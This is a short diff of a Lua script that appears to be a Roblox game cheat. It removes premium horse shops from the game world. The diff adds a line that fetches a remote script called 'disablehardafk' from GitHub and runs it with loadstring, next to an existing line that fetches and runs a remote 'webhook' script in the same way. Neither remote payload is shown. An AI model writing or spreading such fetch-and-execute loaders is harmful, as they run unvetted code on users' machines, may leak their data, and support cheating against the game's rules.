@@ -300,4 +300,5 @@ workspace.Islands["Desert Island"]:WaitForChild("Buildings"):WaitForChild("Horse
 workspace.Islands["Glacier Island"]:WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
 workspace.Islands["Mountain Island"]:WaitForChild("Primary Side"):WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/disablehardafk'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
